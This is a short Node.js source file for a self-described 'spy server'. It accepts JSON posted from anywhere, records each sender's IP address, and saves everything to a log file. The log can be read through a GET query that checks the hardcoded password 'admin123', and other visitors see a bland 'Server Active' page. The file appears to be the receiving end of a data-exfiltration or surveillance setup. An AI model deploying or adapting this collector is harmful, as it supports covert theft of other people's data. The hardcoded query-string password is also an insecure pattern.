const http = require('http');
const fs = require('fs');
const url = require('url');

const HOST = '0.0.0.0';
const PORT = 3000;
const LOG_FILE = 'spy_logs.json';

const server = http.createServer((req, res) => {
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => {
            body += chunk.toString();
        });
        req.on('end', () => {
            try {
                const data = JSON.parse(body);
                data.received_at = new Date().toISOString();
                data.remote_ip = req.socket.remoteAddress;

                let logs = [];
                if (fs.existsSync(LOG_FILE)) {
                    logs = JSON.parse(fs.readFileSync(LOG_FILE, 'utf8'));
                }
                logs.push(data);
                fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));

                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'success', message: 'Data logged' }));
            } catch (e) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'error', message: 'Invalid data' }));
            }
        });
    } else if (req.method === 'GET') {
        const query = url.parse(req.url, true).query;
        if (query.key === 'view' && query.password === 'admin123') {
            if (fs.existsSync(LOG_FILE)) {
                const logs = fs.readFileSync(LOG_FILE, 'utf8');
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(logs);
            } else {
                res.writeHead(404, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ status: 'error', message: 'No logs found' }));
            }
        } else {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end('<h1>Server Active</h1>');
        }
    } else {
        res.writeHead(405);
        res.end();
    }
});

server.listen(PORT, HOST, () => {
    console.log(`Spy server running on http://${HOST}:${PORT}`);
});
